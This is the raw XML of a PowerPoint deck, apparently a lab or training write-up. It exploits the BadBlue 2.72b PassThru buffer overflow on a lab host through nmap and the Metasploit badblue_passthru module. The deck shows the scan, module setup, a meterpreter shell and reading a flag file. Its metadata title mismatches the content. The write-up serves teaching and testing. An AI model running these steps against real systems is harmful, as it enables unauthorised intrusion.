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handoutMasterIdLst>
    <p:handoutMasterId r:id="rId17"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="257" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="259" r:id="rId4"/>
    <p:sldId id="279" r:id="rId5"/>
    <p:sldId id="278" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="280" r:id="rId8"/>
    <p:sldId id="286" r:id="rId9"/>
    <p:sldId id="282" r:id="rId10"/>
    <p:sldId id="287" r:id="rId11"/>
    <p:sldId id="285" r:id="rId12"/>
    <p:sldId id="281" r:id="rId13"/>
    <p:sldId id="288" r:id="rId14"/>
    <p:sldId id="263" r:id="rId15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824" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="85" d="100"/>
          <a:sy n="85" d="100"/>
        </p:scale>
        <p:origin x="1590" y="96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預留位置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6AFA9A-7D3E-42CC-927E-F23DCCD6D484}" type="datetime2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2020年12月30日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71311F18-D970-4D7B-B098-1E7546817641}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="投影片影像預留位置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2674CE4-FBD8-4481-AEFB-CA53E599A74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US" altLang="zh-TW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indent="0" rtl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867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55871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59995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0511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In the command text field, we typed the command “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.28.88” for scanning target machine.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We observed that the machine may be vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>BadBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> 2.72b - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>PassThru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> Buffer Overflow.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW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  <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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9441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We launched a new command line terminal, typed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> and pressed Enter. This launched </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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8693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We typed “search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>badblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>” to search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> modules for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>badblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> server.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b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>We would use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>PassThu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> remote buffer overflow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> module to exploit the target.</a:t>
            </a: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96220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We typed use “use exploit/windows/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>badblue_passthru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>”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launch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> module.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21921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We typed “set RHOSTS 10.4.28.88”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>to set up targe IP.</a:t>
            </a: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10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79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algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Next, We typed “run” to exploit the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>badblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>. Then, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>we had successfully exploited the target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>badblue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) and received a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> shell.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11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2261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We typed ”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>” to get system information.</a:t>
            </a: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12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12516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Finally, we get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>the flag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13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159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800B302-F4DC-4547-9C74-CF794137D166}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-TW" smtClean="0"/>
              <a:t>14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08655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3" name="矩形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4" name="矩形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5" name="矩形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6" name="矩形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7" name="矩形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" name="矩形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17" name="頁尾預留位置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28" name="日期預留位置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fld id="{D680CC22-4E9F-4C64-95EA-15180CEA148A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29" name="投影片編號預留位置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B44B7CC-4AA8-43B8-AE83-02691DCDABC3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kumimoji="0"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572BCF-2FF2-4C6E-B5A8-E6DE1AF4B961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F4FBF5-CDC6-4057-A311-5C521C8F5DB8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>
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="內容預留位置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28" name="頁尾預留位置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26" name="日期預留位置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3E8C17-4C3B-4AED-BB36-C741E1DC4CDE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27" name="投影片編號預留位置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3" name="日期預留位置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/>
          <a:p>
            <a:pPr rtl="0"/>
            <a:fld id="{A274F4D4-41C4-43DF-B10D-F70E9B50FCC2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預留位置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2" name="日期預留位置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0D8C69-8E88-4B86-8CF3-2D8ABB71F89F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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>編輯母片標題樣式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5A7139-9615-44C0-8E48-7B3A81ED52C4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eaVert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圖片預留位置 2" descr="要新增影像的空白預留位置。按一下預留位置，然後選取您要新增的影像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zh-TW" altLang="en-US"/>
              <a:t>按一下圖示以新增圖片</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-TW" alt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D70A3B-5055-4ACA-8D9E-69847E896869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FB655-E279-4DE7-AFF4-4A3FE36E3A57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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>按一下以編輯母片文字樣式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第二層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第三層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第四層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第五層</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0"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7E4AE4-EFA9-4FD9-A229-004A31E547D5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1" name="矩形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2" name="矩形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5" name="矩形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6" name="矩形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7" name="矩形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8" name="矩形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9" name="矩形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0" name="矩形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2" name="標題預留位置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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>按一下以編輯母片標題樣式</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文字預留位置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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="頁尾預留位置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dirty="0"/>
              <a:t>新增頁尾</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="日期預留位置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2233221-9E5A-44E3-8D2A-51D4D9EBD76D}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="投影片編號預留位置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01CF334-2D5C-4859-84A6-CA7E6E43FAEB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>
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="1" pos="3840">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2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vedetails.com/cve/CVE-2007-6377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apid7.com/db/modules/exploit/windows/http/badblue_passthru/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.exploit-db.com/exploits/16806" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.securityfocus.com/archive/1/484834/100/0/thread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algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" b="1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BadBlue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2.72b - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" b="1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PassThru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Buffer Overflow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US" altLang="zh-TW" sz="3600" dirty="0" err="1"/>
              <a:t>Seris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Info</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Reference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189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Info</a:t>
            </a:r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731C092-9C3D-448F-90D7-B28DB48EB4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1508330"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="190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7925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1206205741"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="8524875">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2534220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Target System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WIN-OMCNBKR66MN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1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Target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IP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10.4.28.88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16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Target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Domain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None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390475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Port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TCP: 80, 135, 139, 445, 3389, 49152, 49153, 49154, 49155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642087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OS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altLang="zh-TW" dirty="0"/>
                        <a:t>Windows Server 2008 R2 - 2012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821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86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Info</a:t>
            </a:r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731C092-9C3D-448F-90D7-B28DB48EB4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9921483"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="101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7925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1206205741"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="8524875">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2534220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Application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BadBlue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> 2.7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(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>BadBlue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> Enterprise Edition)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336848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Application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Info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TW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Working Resources </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US" altLang="zh-TW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BadBlue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US" altLang="zh-TW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Enterprise Edition is a webserver intended to share various resources and is developed for Microsoft Windows environments.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249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15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Info</a:t>
            </a:r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731C092-9C3D-448F-90D7-B28DB48EB4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266982"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="367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7925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1206205741"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="8524875">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2534220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Vulnerability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BadBlue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> 2.72b - </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>PassThru</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> Buffer Overflow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336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Versions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&lt;= 2.72b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1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Platforms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Windows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390475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Exploitation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Remote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642087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When the </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>PassThru</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> command of ext.dll is invoked the </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>BadBlue</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> server takes the rest of the URI received by the client and copies it in a stack buffer of 4096 bytes using </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>strcpy</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t>() and causing a buffer overflow.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731310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Impact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altLang="zh-TW" dirty="0"/>
                        <a:t>Informational disclosure.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kumimoji="0" lang="en-US" altLang="zh-TW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Modification of some system files or information is possible.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kumimoji="0" lang="en-US" altLang="zh-TW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There is reduced performance or interruptions in resource availability.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821237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Solution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No fix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293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89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Nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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A0FFDC8-8EAD-4C8E-8849-C54AA224F7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564" y="2910983"/>
            <a:ext cx="5814506" cy="385701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2446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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.28.88  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48915E-F43C-435E-9ACB-446C5928DAFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4495564" y="4295163"/>
            <a:ext cx="3499144" cy="2097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888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1241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msfconsole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427EC9B-2FAA-44AF-B095-291AADD87D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664" y="2367248"/>
            <a:ext cx="5984019" cy="436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8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161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search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>badblue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DDC3A0A-1A9E-459D-9977-C6C4AAA87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910" y="2209800"/>
            <a:ext cx="6200996" cy="449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82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43910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use exploit/windows/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>badblue_passthru</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>show options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9DB7EC1-9132-4528-9978-D763EACD0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901" y="2016779"/>
            <a:ext cx="6327966" cy="479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925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2306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set RHOSTS 10.4.28.88</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>show options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57AA49C-B454-407E-9A56-69781D927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893" y="1861464"/>
            <a:ext cx="6096015" cy="479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run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FA3F4C1-3252-4FA1-9B4A-AEB8D35046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166" y="1922226"/>
            <a:ext cx="6036739" cy="471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75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82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sysinfo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077E1D6-D8C1-425C-AEBA-400DD1044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243" y="2115407"/>
            <a:ext cx="5915770" cy="458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02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13057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shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>cd /</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>type flag.txt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8E59AD5-E4C0-4FEE-BEF1-423F3E7D6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066" y="1368382"/>
            <a:ext cx="5226319" cy="168283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D619E4E-31CF-46FC-9D96-E1AB0D27D1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065" y="3200212"/>
            <a:ext cx="5226319" cy="365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39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hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.cvedetails.com/cve/CVE-2007-6377/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.securityfocus.com/archive/1/484834/100/0/threaded</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://www.exploit-db.com/exploits/16806</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://www.rapid7.com/db/modules/exploit/windows/http/badblue_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>passthru/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rt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608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訓練課程簡報">
  <a:themeElements>
    <a:clrScheme name="中庸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4615_TF03460604.potx" id="{459C345E-EC57-4CE6-8378-CD5A0E02B40D}" vid="{75388508-C140-4AE9-B3F8-1A15F21DF63F}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office 佈景主題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</TotalTime>
  <Words>463</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>寬螢幕</PresentationFormat>
  <Paragraphs>101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2" baseType="lpstr">
      <vt:lpstr>ArialMT</vt:lpstr>
      <vt:lpstr>Microsoft JhengHei UI</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Georgia</vt:lpstr>
      <vt:lpstr>Helvetica</vt:lpstr>
      <vt:lpstr>Wingdings 2</vt:lpstr>
      <vt:lpstr>訓練課程簡報</vt:lpstr>
      <vt:lpstr>BadBlue 2.72b - PassThru Buffer Overflow</vt:lpstr>
      <vt:lpstr>Abstract</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Info</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit</vt:lpstr>
      <vt:lpstr>Exploit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漏洞資訊-SolarWinds Orion Platform部分版本存在後門程式，允許攻擊者遠端執行任意程式碼，請儘速確認並進行版本更新</dc:title>
  <dc:creator>zihling chen</dc:creator>
  <cp:lastModifiedBy>zihling chen</cp:lastModifiedBy>
  <cp:revision>111</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-12-29T03:57:03Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-12-29T16:30:57Z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